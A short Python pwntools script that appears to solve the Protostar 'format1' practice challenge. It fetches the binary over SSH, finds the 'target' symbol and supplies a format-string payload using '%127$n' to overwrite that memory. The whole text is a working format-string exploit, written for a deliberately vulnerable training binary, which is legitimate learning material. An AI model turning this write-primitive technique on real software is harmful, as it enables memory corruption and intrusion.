#!/usr/bin/python
from pwn import *
import os
from ssh import *

binarypath='/opt/protostar/bin/format1'
sh.download(binarypath)
elf=ELF('./format1')
addr=elf.symbols['target']
payload=p32(addr)+'BB'+"%127$n"
p=sh.run([binarypath,payload])
p.recv(6)
print p.recvall()
os.system('rm format1')
